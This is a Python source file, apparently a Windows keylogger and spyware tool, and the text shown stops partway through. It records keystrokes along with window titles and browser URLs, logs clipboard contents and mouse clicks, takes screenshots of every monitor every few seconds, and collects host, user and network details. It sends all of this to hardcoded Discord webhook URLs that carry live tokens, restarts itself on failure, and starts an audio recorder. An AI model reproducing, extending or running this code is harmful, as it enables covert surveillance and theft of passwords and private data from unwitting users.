import os
import time
import threading
import json
from datetime import datetime
import requests
from PIL import Image, ImageDraw, ImageFont
import pyautogui
import io
import win32gui
import win32process
import win32api
import win32con
import win32clipboard
import psutil
from pynput import keyboard, mouse
from screeninfo import get_monitors
import mss
import numpy as np
import sys
import platform
import ctypes
import traceback
import subprocess
import socket
import uuid
import re
import logging
from urllib.parse import urlparse
import base64
import glob  # Added for file pattern matching

# Delete all .wav files in the script directory before starting
def cleanup_wav_files():
    """Delete all .wav files in the script directory"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        wav_files = glob.glob(os.path.join(script_dir, "*.wav"))
        count = 0
        
        for file in wav_files:
            try:
                os.remove(file)
                count += 1
            except Exception as e:
                print(f"Failed to delete {file}: {e}")
                
        print(f"Deleted {count} .wav files from {script_dir}")
        return count
    except Exception as e:
        print(f"Error cleaning up .wav files: {e}")
        return 0

# Clean up .wav files at script startup
cleanup_wav_files()

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("monitor_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("MonitorSystem")

# Determine if we're on Windows
USING_WINDOWS = platform.system() == 'Windows'

# Configuration
SCREENSHOT_WEBHOOK_URL = "https://discord.com/api/webhooks/1345206237570273362/ZwRjp4dOfB-dN_2cR3ZVuFRqewmvdKpCiTqQuSkvtCeD0ZKqwN8ks1u82ps1Mgaz5cU6"
KEYLOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1345206544635138190/x78uNc_X-maXpXo-qdFsrFD_i-kWzaW91-Dld2TWQAoL2jBjLMwCpiFe2SOXwMfAGUFA"
SECOND_MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1345210275724529774/hlpXSxZzIzTaaEp9_mDngKPRe3AQqk_IRh7MHjhhebfCLfyC4LxHOGtVhN93afyDbWHc"
THIRD_MONITOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1345210366598316104/JEyNF019lUBaz9RF9q4xM1vHddqMNR_6TEdOmcZaX4aM-FvTgjDe-tVeT90qS8Dba_2P"
ERROR_WEBHOOK_URL = "https://discord.com/api/webhooks/1345206544635138190/x78uNc_X-maXpXo-qdFsrFD_i-kWzaW91-Dld2TWQAoL2jBjLMwCpiFe2SOXwMfAGUFA"

# Enhanced configuration
SCREENSHOT_INTERVAL = 3  # How often screenshots are taken, in seconds
KEYLOG_SEND_INTERVAL = 60  # How often collected keystrokes are sent, in seconds
MAX_SCREENSHOT_SIZE = 7.8 * 1024 * 1024  # 7.8 MB maximum size for screenshots (Discord limit)
CLIPBOARD_CHECK_INTERVAL = 5  # How often clipboard content is checked for changes, in seconds
ACTIVE_WINDOW_SCREENSHOT_ENABLED = True  # Whether to take screenshots of the active window when certain actions occur
INCLUDE_CURSOR_IN_SCREENSHOT = True  # Whether to show the mouse cursor position in screenshots
SYSTEM_INFO_OVERLAY = True  # Whether to include system information overlay on screenshots
RESTART_ON_ERROR = True  # Whether to automatically restart the script if critical errors occur
WATCHDOG_INTERVAL = 30  # How often the watchdog checks if threads are running properly, in seconds
ADAPTIVE_SCREENSHOT_QUALITY = True  # Whether to automatically adjust screenshot quality to stay under size limit
DETAILED_KEYSTROKE_TIMING = True  # Whether to record timing between keystrokes for typing speed analysis
CLEANUP_WAV_FILES = True  # Whether to delete .wav files in the script directory at startup

# Health monitoring
last_screenshot_time = time.time()
last_keylog_time = time.time()
threads_health = {}

# Special key mapping for better readability
SPECIAL_KEYS = {
    keyboard.Key.space: " [Space] ",
    keyboard.Key.enter: " [Enter]\n",
    keyboard.Key.tab: " [Tab] ",
    keyboard.Key.backspace: " [Backspace] ",
    keyboard.Key.delete: " [Delete] ",
    keyboard.Key.shift: " [Shift] ",
    keyboard.Key.ctrl: " [Ctrl] ",
    keyboard.Key.alt: " [Alt] ",
    keyboard.Key.caps_lock: " [CapsLock] ",
    keyboard.Key.esc: " [Esc] ",
    keyboard.Key.f1: " [F1] ",
    keyboard.Key.f2: " [F2] ",
    keyboard.Key.f3: " [F3] ",
    keyboard.Key.f4: " [F4] ",
    keyboard.Key.f5: " [F5] ",
    keyboard.Key.f6: " [F6] ",
    keyboard.Key.f7: " [F7] ",
    keyboard.Key.f8: " [F8] ",
    keyboard.Key.f9: " [F9] ",
    keyboard.Key.f10: " [F10] ",
    keyboard.Key.f11: " [F11] ",
    keyboard.Key.f12: " [F12] ",
    keyboard.Key.up: " [↑] ",
    keyboard.Key.down: " [↓] ",
    keyboard.Key.left: " [←] ",
    keyboard.Key.right: " [→] ",
    keyboard.Key.page_up: " [PgUp] ",
    keyboard.Key.page_down: " [PgDn] ",
    keyboard.Key.home: " [Home] ",
    keyboard.Key.end: " [End] ",
    keyboard.Key.print_screen: " [PrtSc] ",
    keyboard.Key.scroll_lock: " [ScrollLock] ",
    keyboard.Key.pause: " [Pause] ",
    keyboard.Key.insert: " [Insert] ",
    keyboard.Key.menu: " [Menu] ",
}

# Global variables for keylog readability
key_logs = []
key_log_lock = threading.Lock()
current_window = ""
current_window_text = ""
last_window_change_time = datetime.now()
key_stats = {"total": 0, "special": 0, "alphanumeric": 0, "symbols": 0}
key_timings = []
active_modifiers = set()
last_clipboard_content = ""
last_key_time = time.time()

# URL patterns for detection in browser windows
URL_PATTERNS = [
    r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+',
    r'www\.(?:[-\w.]|(?:%[\da-fA-F]{2}))+' 
]

# Keep track of mouse position and clicks
mouse_position = (0, 0)
mouse_clicks = []

def get_system_info():
    """Get detailed system information."""
    try:
        info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": platform.platform(),
            "processor": platform.processor(),
            "machine": platform.machine(),
            "python_version": platform.python_version(),
            "username": os.getlogin(),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                    for elements in range(0, 48, 8)][::-1]),
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            "uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
        }
        
        # Add CPU info
        cpu_info = {"cores": psutil.cpu_count(logical=False),
                   "threads": psutil.cpu_count(logical=True),
                   "usage_percent": psutil.cpu_percent(interval=1)}
        info["cpu"] = cpu_info
        
        # Add memory info
        mem = psutil.virtual_memory()
        mem_info = {"total": f"{mem.total / (1024**3):.2f} GB",
                   "available": f"{mem.available / (1024**3):.2f} GB",
                   "used": f"{mem.used / (1024**3):.2f} GB",
                   "percent": f"{mem.percent}%"}
        info["memory"] = mem_info
        
        # Add disk info
        disk_info = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info.append({
                    "device": partition.device,
                    "mountpoint": partition.mountpoint,
                    "filesystem": partition.fstype,
                    "total": f"{usage.total / (1024**3):.2f} GB",
                    "used": f"{usage.used / (1024**3):.2f} GB",
                    "free": f"{usage.free / (1024**3):.2f} GB",
                    "percent": f"{usage.percent}%"
                })
            except:
                pass
        info["disks"] = disk_info
        
        return info
    except Exception as e:
        logger.error(f"Error getting system info: {e}")
        return {"error": str(e)}

def restart_script():
    """Restart the current script."""
    logger.warning("Restarting script due to error...")
    
    try:
        # Send notification about restart
        send_error_notification("Script is restarting due to detected issues or errors.")
    except:
        pass
        
    try:
        # Get the command used to run this script
        python_executable = sys.executable
        script_path = os.path.abspath(__file__)
        
        # Start the script in a new process
        subprocess.Popen([python_executable, script_path])
        
        # Exit the current process
        logger.info("New process started, exiting current process...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Failed to restart script: {e}")

def send_error_notification(error_message, include_traceback=True):
    """Send error notification to Discord webhook."""
    try:
        # Format the error message
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_info = get_system_info()
        
        message = f"⚠️ **ERROR ALERT** ⚠️\n\n"
        message += f"**Time:** {timestamp}\n"
        message += f"**Host:** {system_info['hostname']}\n"
        message += f"**User:** {system_info['username']}\n"
        message += f"**Error:** {error_message}\n\n"
        
        if include_traceback:
            tb = traceback.format_exc()
            if tb and tb != "NoneType: None\n":
                message += f"**Traceback:**\n```\n{tb[:1000]}```\n"
                if len(tb) > 1000:
                    message += "(traceback truncated...)\n"
        
        # Add system resource info
        message += f"\n**System Resources:**\n"
        message += f"CPU: {system_info['cpu']['usage_percent']}%\n"
        message += f"Memory: {system_info['memory']['percent']}\n"
        
        # Send the error notification
        payload = {"content": message}
        requests.post(ERROR_WEBHOOK_URL, json=payload)
    except Exception as e:
        logger.error(f"Failed to send error notification: {e}")

def get_active_window_details():
    """Get detailed information about the currently active window."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        
        # Get window title and dimensions
        window_title = win32gui.GetWindowText(hwnd)
        window_rect = win32gui.GetWindowRect(hwnd)
        width = window_rect[2] - window_rect[0]
        height = window_rect[3] - window_rect[1]
        
        # Get process information
        try:
            process = psutil.Process(pid)
            process_name = process.name()
            process_path = process.exe()
            process_cmdline = process.cmdline()
            process_create_time = datetime.fromtimestamp(process.create_time()).strftime('%Y-%m-%d %H:%M:%S')
            
            # Check if this is a browser window and try to extract URL
            urls = []
            if process_name.lower() in ["chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", "opera.exe", "brave.exe"]:
                # Try to extract URL from window title for common browsers
                for pattern in URL_PATTERNS:
                    matches = re.findall(pattern, window_title)
                    urls.extend(matches)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            process_name = "Unknown"
            process_path = "Unknown"
            process_cmdline = []
            process_create_time = "Unknown"
            urls = []
        
        result = {
            "title": window_title,
            "hwnd": hwnd,
            "pid": pid,
            "process_name": process_name,
            "process_path": process_path,
            "process_cmdline": process_cmdline,
            "process_create_time": process_create_time,
            "window_rect": window_rect,
            "width": width,
            "height": height,
            "urls": urls
        }
        
        return result
    except Exception as e:
        logger.error(f"Error getting detailed window info: {str(e)}")
        return {
            "title": "Error getting window info",
            "error": str(e),
            "process_name": "Unknown"
        }

def check_clipboard():
    """Check the clipboard for changes and log them."""
    global last_clipboard_content
    
    try:
        win32clipboard.OpenClipboard()
        
        # Try different clipboard formats
        formats_to_try = [win32clipboard.CF_UNICODETEXT, win32clipboard.CF_TEXT]
        
        clipboard_content = None
        for clipboard_format in formats_to_try:
            try:
                if win32clipboard.IsClipboardFormatAvailable(clipboard_format):
                    clipboard_content = win32clipboard.GetClipboardData(clipboard_format)
                    break
            except:
                continue
                
        win32clipboard.CloseClipboard()
        
        # Check if content changed and is not empty
        if clipboard_content and clipboard_content != last_clipboard_content:
            last_clipboard_content = clipboard_content
            
            # Truncate if too long
            if len(clipboard_content) > 500:
                display_content = clipboard_content[:500] + "... (truncated)"
            else:
                display_content = clipboard_content
                
            # Log clipboard change
            window_details = get_active_window_details()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with key_log_lock:
                key_logs.append({
                    "timestamp": timestamp,
                    "type": "clipboard",
                    "window": f"{window_details['title']} ({window_details['process_name']})",
                    "text": f"📋 CLIPBOARD: {display_content}"
                })
            
            return True
    except Exception as e:
        logger.error(f"Error checking clipboard: {e}")
    
    return False

def format_key(key):
    """Enhanced format for key press with support for combinations."""
    global active_modifiers
    
    # Handle modifier keys
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        active_modifiers.add("Ctrl")
        return SPECIAL_KEYS[keyboard.Key.ctrl]
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        active_modifiers.add("Shift")
        return SPECIAL_KEYS[keyboard.Key.shift]
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        active_modifiers.add("Alt")
        return SPECIAL_KEYS[keyboard.Key.alt]
    
    # Format the key with active modifiers
    if key in SPECIAL_KEYS:
        key_str = SPECIAL_KEYS[key]
        # If this is not a modifier key itself and we have active modifiers
        if "Ctrl" not in key_str and "Shift" not in key_str and "Alt" not in key_str and active_modifiers:
            # Format as combination
            mod_str = "+".join(active_modifiers)
            key_str = f" [{mod_str}+{key_str.strip()[1:-1]}] "
        return key_str
    
    try:
        # For regular character keys
        if hasattr(key, 'char') and key.char is not None:
            # If we have modifiers active and this is a regular key
            if active_modifiers and key.char:
                mod_str = "+".join(active_modifiers)
                return f" [{mod_str}+{key.char}] "
            return key.char
        else:
            # Handle keys that have None as char
            key_str = str(key)
            return f" [{key_str}] "
    except (AttributeError, TypeError):
        # For any other unusual key events
        try:
            key_str = str(key).replace('Key.', '')
            return f" [{key_str}] "
        except:
            return " [Unknown Key] "

def on_key_release(key):
    """Handle key release events to track modifier keys."""
    global active_modifiers
    
    try:
        # Remove modifiers when they're released
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            active_modifiers.discard("Ctrl")
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            active_modifiers.discard("Shift")
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            active_modifiers.discard("Alt")
    except:
        # Ensure we never break the listener even if an error occurs
        pass

def on_key_press(key):
    """Enhanced key press handler with timing and statistics."""
    global current_window, current_window_text, last_window_change_time
    global key_stats, key_timings, last_key_time
    
    try:
        # Calculate time since last keystroke
        current_time = time.time()
        time_since_last_key = current_time - last_key_time
        last_key_time = current_time
        
        # Update statistics
        key_stats["total"] += 1
        if key in SPECIAL_KEYS:
            key_stats["special"] += 1
        elif hasattr(key, 'char') and key.char:
            if key.char.isalnum():
                key_stats["alphanumeric"] += 1
            else:
                key_stats["symbols"] += 1
        
        # Record timing information if enabled
        if DETAILED_KEYSTROKE_TIMING and time_since_last_key < 10:  # Only record if less than 10 seconds between keystrokes
            key_timings.append(time_since_last_key)
            
            # Keep only the last 100 timings
            if len(key_timings) > 100:
                key_timings.pop(0)
        
        with key_log_lock:
            # Get detailed window info
            window_details = get_active_window_details()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Create window title with more details
            detailed_title = f"{window_details['title']} ({window_details['process_name']})"
            
            # Check if window changed
            if detailed_title != current_window:
                # If window changed, add a separator and window info
                if current_window_text:
                    key_logs.append({
                        "timestamp": timestamp,
                        "type": "window_change",
                        "window": detailed_title,
                        "text": current_window_text,
                        "window_details": window_details
                    })
                
                current_window = detailed_title
                current_window_text = ""
                last_window_change_time = datetime.now()
                
                # Check if this is a browser and we found URLs
                if window_details.get('urls'):
                    url_text = "\n🌐 URL detected: " + ", ".join(window_details['urls']) + "\n"
                    current_window_text += url_text
            
            # Format and add the key press - with safety check and timing
            key_formatted = format_key(key)
            if key_formatted is not None:  # Safety check
                if DETAILED_KEYSTROKE_TIMING and time_since_last_key < 10:
                    # Add timing info for significant pauses
                    if time_since_last_key > 1.5:
                        current_window_text += f" [Pause: {time_since_last_key:.1f}s] "
                current_window_text += key_formatted
            else:
                current_window_text += " [?] "  # Fallback for None values
            
            # If we have accumulated a lot of text, save it as a segment
            if len(current_window_text) > 100:
                key_logs.append({
                    "timestamp": timestamp,
                    "type": "text",
                    "window": current_window,
                    "text": current_window_text
                })
                current_window_text = ""
                
        # Take screenshot of active window if a special key was pressed
        if ACTIVE_WINDOW_SCREENSHOT_ENABLED and key in [keyboard.Key.enter, keyboard.Key.space]:
            threading.Thread(target=take_active_window_screenshot, daemon=True).start()
    
    except Exception as e:
        logger.error(f"Error in key press handler: {e}")
        # Ensure we never break the listener even if an error occurs
        pass

def on_mouse_click(x, y, button, pressed):
    """Track mouse clicks for activity monitoring."""
    global mouse_clicks, mouse_position
    
    try:
        if pressed:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            mouse_position = (x, y)
            
            # Record the click
            click_info = {
                "timestamp": timestamp,
                "position": (x, y),
                "button": str(button)
            }
            
            mouse_clicks.append(click_info)
            
            # Keep only the last 50 clicks
            if len(mouse_clicks) > 50:
                mouse_clicks.pop(0)
                
            # Take a screenshot of the active window on mouse clicks
            if ACTIVE_WINDOW_SCREENSHOT_ENABLED:
                # Only take screenshot on left button click to avoid too many screenshots
                if button == mouse.Button.left:
                    threading.Thread(target=take_active_window_screenshot, daemon=True).start()
    except Exception as e:
        logger.error(f"Error in mouse click handler: {e}")

def on_mouse_move(x, y):
    """Track mouse movement."""
    global mouse_position
    mouse_position = (x, y)

def draw_cursor_on_image(img, position):
    """Draw a cursor on the screenshot."""
    try:
        draw = ImageDraw.Draw(img)
        x, y = position
        
        # Draw a red cursor
        cursor_color = (255, 0, 0, 255)  # Red with full opacity
        
        # Draw a circle at cursor position
        draw.ellipse((x-5, y-5, x+5, y+5), outline=cursor_color, width=2)
        
        # Draw crosshair lines
        draw.line((x-10, y, x+10, y), fill=cursor_color, width=2)
        draw.line((x, y-10, x, y+10), fill=cursor_color, width=2)
        
        return img
    except Exception as e:
        logger.error(f"Error drawing cursor: {e}")
        return img

def add_overlay_to_screenshot(img, include_system_info=True):
    """Add information overlay to screenshot."""
    try:
        draw = ImageDraw.Draw(img)
        width, height = img.size
        
        # Try to load a font, fall back to default if not available
        font = None
        try:
            # First try to use Arial or a similar system font
            font_path = "arial.ttf"  # Windows default font
            font = ImageFont.truetype(font_path, 14)
        except:
            # Fall back to default font
            font = ImageFont.load_default()
        
        # Add timestamp and window title
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_details = get_active_window_details()
        title_text = f"{timestamp} | {window_details['title']} ({window_details['process_name']})"
        
        # Draw semi-transparent background for text
        overlay_height = 30
        overlay_color = (0, 0, 0, 128)  # Semi-transparent black
        draw.rectangle((0, height - overlay_height, width, height), fill=overlay_color)
        
        # Draw text
        text_color = (255, 255, 255, 255)  # White
        draw.text((10, height - overlay_height + 5), title_text, fill=text_color, font=font)
        
        # Add system info if requested
        if include_system_info:
            system_info = get_system_info()
            
            # Create system info text at the top
            info_text = f"CPU: {system_info['cpu']['usage_percent']}% | "
            info_text += f"RAM: {system_info['memory']['percent']} | "
            info_text += f"User: {system_info['username']} | "
            info_text += f"Host: {system_info['hostname']}"
            
            # Draw semi-transparent background at the top
            draw.rectangle((0, 0, width, overlay_height), fill=overlay_color)
            
            # Draw system info text
            draw.text((10, 5), info_text, fill=text_color, font=font)
        
        return img
    except Exception as e:
        logger.error(f"Error adding overlay to screenshot: {e}")
        return img

def take_active_window_screenshot():
    """Take a screenshot of just the active window."""
    try:
        # Get the active window details
        window_details = get_active_window_details()
        hwnd = window_details["hwnd"]
        
        # Get the window rectangle
        window_rect = win32gui.GetWindowRect(hwnd)
        left, top, right, bottom = window_rect
        width = right - left
        height = bottom - top
        
        # Take screenshot of the specific area
        with mss.mss() as sct:
            monitor = {"top": top, "left": left, "width": width, "height": height}
            sct_img = sct.grab(monitor)
            
            # Convert to PIL Image with proper color conversion (BGR to RGB)
            img_array = np.array(sct_img)
            # Convert BGRA to RGB (MSS captures in BGRA format)
            img_array = img_array[:, :, :3]  # Remove alpha channel
            img_array = img_array[:, :, ::-1]  # Convert BGR to RGB
            img = Image.fromarray(img_array)
            
            # Add overlay with window information
            img = add_overlay_to_screenshot(img, include_system_info=True)
            
            # Convert to bytes
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')
            img_bytes = img_byte_arr.getvalue()
            
            # Compress if necessary
            quality = 95
            while len(img_bytes) > MAX_SCREENSHOT_SIZE and quality > 10:
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='JPEG', quality=quality, optimize=True)
                img_bytes = img_byte_arr.getvalue()
                quality -= 5
            
            # Send to Discord
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            files = {
                'file': (f'window_{window_details["process_name"]}_{timestamp}.jpg', img_bytes, 'image/jpeg')
            }
            
            payload = {
                'content': f"📸 **ACTIVE WINDOW SCREENSHOT**\n**Time:** {timestamp}\n**Window:** {window_details['title']}\n**Process:** {window_details['process_name']}\n**Size:** {width}x{height}"
            }
            
            response = requests.post(SCREENSHOT_WEBHOOK_URL, data=payload, files=files)
            if response.status_code not in [200, 204]:
                logger.error(f"Failed to send active window screenshot: {response.status_code}, {response.text}")
    
    except Exception as e:
        logger.error(f"Error taking active window screenshot: {e}")

def take_and_send_screenshot():
    """Enhanced screenshot function with cursor and overlay."""
    global last_screenshot_time, mouse_position
    
    last_screenshot_time = time.time()
    
    try:
        # Use MSS for reliable multi-monitor screenshots
        with mss.mss() as sct:
            monitor_list = sct.monitors[1:]  # Skip the first one which is the "all in one" monitor
            
            # Make sure we don't exceed our limit of 3 monitors
            monitor_list = monitor_list[:3]
            
            # If no monitors were detected by MSS, fall back to original method
            if not monitor_list:
                logger.info("No monitors detected by MSS, falling back to default")
                monitor_list = [{"left": 0, "top": 0, "width": 1920, "height": 1080}]
            
            for i, monitor in enumerate(monitor_list):
                # Select the appropriate webhook based on monitor index
                if i == 0:
                    webhook_url = SCREENSHOT_WEBHOOK_URL
                    monitor_name = "Primary"
                elif i == 1:
                    webhook_url = SECOND_MONITOR_WEBHOOK_URL
                    monitor_name = "Secondary"
                elif i == 2:
                    webhook_url = THIRD_MONITOR_WEBHOOK_URL
                    monitor_name = "Tertiary"
                else:
                    continue  # Skip beyond 3rd monitor
                
                # Capture screenshot using MSS
                sct_img = sct.grab(monitor)
                
                # Convert to PIL Image with proper color conversion (BGR to RGB)
                img_array = np.array(sct_img)
                img_array = img_array[:, :, :3]  # Remove alpha channel
                img_array = img_array[:, :, ::-1]  # Convert BGR to RGB
                img = Image.fromarray(img_array)
                
                # Add cursor if enabled
                if INCLUDE_CURSOR_IN_SCREENSHOT:
                    # Adjust mouse position relative to monitor
                    rel_x = mouse_position[0] - monitor.get('left', 0)
                    rel_y = mouse_position[1] - monitor.get('top', 0)
                    
                    # Check if cursor is within this monitor
                    if (0 <= rel_x < monitor.get('width', 1920) and 
                        0 <= rel_y < monitor.get('height', 1080)):
                        img = draw_cursor_on_image(img, (rel_x, rel_y))
                
                # Add information overlay
                if SYSTEM_INFO_OVERLAY:
                    img = add_overlay_to_screenshot(img)
                
                # Convert to bytes with adaptive quality
                img_byte_arr = io.BytesIO()
                if ADAPTIVE_SCREENSHOT_QUALITY:
                    # Start with PNG for best quality
                    img.save(img_byte_arr, format='PNG')
                    img_bytes = img_byte_arr.getvalue()
                    
                    # If too large, progressively reduce quality with JPEG
                    quality = 95
                    while len(img_bytes) > MAX_SCREENSHOT_SIZE and quality > 10:
                        img_byte_arr = io.BytesIO()
                        img.save(img_byte_arr, format='JPEG', quality=quality, optimize=True, subsampling=0)
                        img_bytes = img_byte_arr.getvalue()
                        quality -= 5
                        
                        # Log quality reduction for debugging
                        if quality < 90:
                            logger.info(f"Reduced image quality to {quality}% to fit size limit")
                else:
                    # Fixed quality JPEG
                    img.save(img_byte_arr, format='JPEG', quality=85, optimize=True)
                    img_bytes = img_byte_arr.getvalue()
                
                # Create enriched content with system details
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Get active window info for screenshot context
                window_details = get_active_window_details()
                
                # Create enhanced content with more details
                content = f"**📷 {monitor_name.upper()} MONITOR SCREENSHOT**\n"
                content += f"**Time:** {timestamp}\n"
                content += f"**Active Window:** {window_details['title']}\n"
                content += f"**Process:** {window_details['process_name']}\n"
                content += f"**Resolution:** {monitor.get('width', 0)}x{monitor.get('height', 0)}\n"
                
                # Add URL if available
                if window_details.get('urls'):
                    content += f"**URL:** {window_details['urls'][0]}\n"
                
                # Send to Discord with enhanced metadata
                files = {
                    'file': (f'screenshot_{monitor_name}_{timestamp}.jpg', img_bytes, 'image/jpeg')
                }
                
                payload = {'content': content}
                
                response = requests.post(webhook_url, data=payload, files=files)
                if response.status_code not in [200, 204]:
                    logger.error(f"Failed to send {monitor_name} screenshot: {response.status_code}, {response.text}")
                else:
                    logger.info(f"Successfully sent {monitor_name} screenshot at {timestamp}")
    
    except Exception as e:
        logger.error(f"Error taking/sending screenshot: {e}")
        if RESTART_ON_ERROR:
            # Don't restart immediately for screenshot errors unless they persist
            pass  # The watchdog will handle persistent failures

def send_key_logs():
    """Enhanced version of the key logger with more detailed statistics and formatting."""
    global key_logs, current_window, current_window_text, key_stats, key_timings
    
    with key_log_lock:
        # Add current text buffer if there's any
        if current_window_text:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key_logs.append({
                "timestamp": timestamp,
                "type": "text",
                "window": current_window,
                "text": current_window_text
            })
            current_window_text = ""
        
        if not key_logs:
            logger.info("No key logs to send")
            return
        
        logs_to_send = key_logs.copy()
        key_logs = []
    
    try:
        # Format the key logs with enhanced readability and structure
        formatted_logs = []
        current_section = None
        
        for log in logs_to_send:
            if log["type"] == "window_change" or current_section is None:
                if current_section:
                    formatted_logs.append(current_section)
                
                # Start new section with more detailed header
                current_section = f"### {log['timestamp']} | {log['window']}\n"
                
                # Add metadata if available
                if 'window_details' in log:
                    details = log['window_details']
                    if 'process_path' in details and details['process_path'] != "Unknown":
                        current_section += f"Process: {details['process_path']}\n"
                    
                    # Add URLs if this is a browser
                    if 'urls' in details and details['urls']:
                        current_section += f"URLs: {', '.join(details['urls'])}\n"
                
                # Add the actual text content
                if log["text"]:
                    current_section += log["text"]
            
            elif log["type"] == "clipboard":
                # Special formatting for clipboard events
                if current_section:
                    current_section += f"\n{log['text']}\n"
            else:
                # Add to existing section
                current_section += log["text"]
        
        # Add the last section
        if current_section:
            formatted_logs.append(current_section)
        
        # Calculate keystroke statistics
        avg_typing_speed = 0
        if key_timings:
            # Calculate average time between keystrokes in seconds
            avg_interval = sum(key_timings) / len(key_timings)
            # Convert to CPM (Characters Per Minute)
            avg_typing_speed = int(60 / avg_interval) if avg_interval > 0 else 0
        
        # Create a statistics block
        stats_block = f"**⌨️ KEYLOGGING STATISTICS**\n"
        stats_block += f"**Total Keystrokes:** {key_stats['total']}\n"
        stats_block += f"**Alphanumeric:** {key_stats['alphanumeric']} | **Special Keys:** {key_stats['special']} | **Symbols:** {key_stats['symbols']}\n"
        if avg_typing_speed > 0:
            stats_block += f"**Avg. Typing Speed:** ~{avg_typing_speed} CPM\n"
        
        # Send stats first as a separate message
        stats_payload = {"content": stats_block, "username": "KeyLogger"}
        try:
            response = requests.post(KEYLOG_WEBHOOK_URL, json=stats_payload)
            if response.status_code not in [200, 204]:
                logger.error(f"Failed to send keystroke statistics: {response.status_code}")
        except Exception as e:
            logger.error(f"Error sending keystroke stats: {e}")
        
        # Send logs in chunks that won't exceed Discord's limit
        for log_section in formatted_logs:
            # Split into chunks if needed
            chunks = [log_section[i:i+1900] for i in range(0, len(log_section), 1900)]
            
            for i, chunk in enumerate(chunks):
                # Add page numbering for multi-chunk logs
                header = f"**Keylog Data** "
                if len(chunks) > 1:
                    header += f"(Part {i+1}/{len(chunks)})"
                
                payload = {
                    "content": f"{header}\n```markdown\n{chunk}\n```",
                    "username": "KeyLogger"
                }
                
                response = requests.post(KEYLOG_WEBHOOK_URL, json=payload)
                # 204 is a success status (No Content)
                if response.status_code not in [200, 204]:
                    logger.error(f"Failed to send key logs: {response.status_code}, {response.text}")
                
                # Small delay between chunks to avoid rate limits
                time.sleep(1)
        
        # Reset statistics after sending
        key_stats = {"total": 0, "special": 0, "alphanumeric": 0, "symbols": 0}
        key_timings = []
        
        logger.info(f"Successfully sent {len(formatted_logs)} sections of key logs")
    
    except Exception as e:
        logger.error(f"Error sending key logs: {e}")
        if RESTART_ON_ERROR:
            # Don't restart immediately for key log errors unless they persist
            pass  # The watchdog will handle persistent failures

def clipboard_thread_function():
    """Thread function for monitoring clipboard changes."""
    while True:
        try:
            check_clipboard()
            time.sleep(CLIPBOARD_CHECK_INTERVAL)
        except Exception as e:
            logger.error(f"Error in clipboard monitoring: {e}")
            time.sleep(CLIPBOARD_CHECK_INTERVAL * 2)  # Wait longer after error

def watchdog_thread_function():
    """Thread function to monitor the health of other threads and restart if necessary."""
    global last_screenshot_time, last_keylog_time, threads_health
    
    while True:
        try:
            current_time = time.time()
            system_info = get_system_info()
            
            # Check for thread timeouts or freezes
            screenshot_timeout = current_time - last_screenshot_time > SCREENSHOT_INTERVAL * 10
            keylog_timeout = current_time - last_keylog_time > KEYLOG_SEND_INTERVAL * 3
            
            # Log system resource usage for monitoring
            logger.debug(f"Watchdog check - CPU: {system_info['cpu']['usage_percent']}%, " +
                         f"RAM: {system_info['memory']['percent']}")
            
            if screenshot_timeout or keylog_timeout:
                error_msg = "Watchdog detected frozen threads: "
                if screenshot_timeout:
                    error_msg += "Screenshot thread frozen. "
                if keylog_timeout:
                    error_msg += "Keylogger thread frozen. "
                
                logger.error(error_msg)
                
                if RESTART_ON_ERROR:
                    send_error_notification(error_msg)
                    restart_script()
            
            # Sleep for watchdog interval
            time.sleep(WATCHDOG_INTERVAL)
            
        except Exception as e:
            logger.error(f"Error in watchdog thread: {e}")
            time.sleep(WATCHDOG_INTERVAL)

def integrate_audio_recording():
    """Integrate with record_system_audio.py to enable audio recording."""
    try:
        # Import the functions from record_system_audio.py
        script_dir = os.path.dirname(os.path.abspath(__file__))
        record_audio_path = os.path.join(script_dir, "record_system_audio.py")
        
        if os.path.exists(record_audio_path):
            logger.info(f"Found audio recording script at {record_audio_path}")
            
            # Try to launch the audio recording script as a subprocess
            audio_process = subprocess.Popen(
                [sys.executable, record_audio_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                text=True
            )
            
            logger.info(f"Started audio recording process with PID: {audio_process.pid}")
            return audio_process
        else:
            logger.warning("Audio recording script not found at expected path")
            return None
    except Exception as e:
        logger.error(f"Failed to integrate audio recording: {e}")
        return None

def screenshot_thread_function():
    """Thread function for taking screenshots periodically."""
    global last_screenshot_time
    
